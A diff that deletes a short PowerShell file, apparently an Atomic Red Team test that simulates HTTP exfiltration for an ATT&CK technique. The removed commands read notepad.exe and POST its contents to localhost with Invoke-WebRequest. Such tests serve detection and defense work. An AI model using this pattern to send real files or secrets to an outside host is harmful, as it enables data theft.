@@ -1,8 +1,0 @@
-#TechniqueName: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
-#AtomicTestName: Exfiltration Over Alternative Protocol - HTTP
-#Language: ps1
-
-#commands
-$content = Get-Content C:\Windows\System32\notepad.exe
-Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content
-
